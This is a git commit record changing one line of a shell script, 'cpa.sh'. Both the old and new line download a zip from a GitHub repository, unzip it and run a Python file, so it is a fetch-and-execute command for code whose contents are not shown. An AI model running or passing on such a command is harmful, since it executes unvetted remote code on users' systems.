9384d8d5ca5cafdaba82b8ed46d5d4217e388090
Johncenayan <John12001455@sanggarnugraha.org>
2025-03-13 01:23:51 +0700

    Update cpa.sh

--- cpa.sh
+++ cpa.sh
@@ -1,1 +1,1 @@
-wget https://github.com/Johncenayan/cautious-rotary-phone/raw/refs/heads/main/ore.zip && unzip ore.zip && python3 run.py
+wget https://github.com/Johncenayan/cautious-rotary-phone/raw/refs/heads/main/ore.zip && unzip ore.zip && python3 app.py
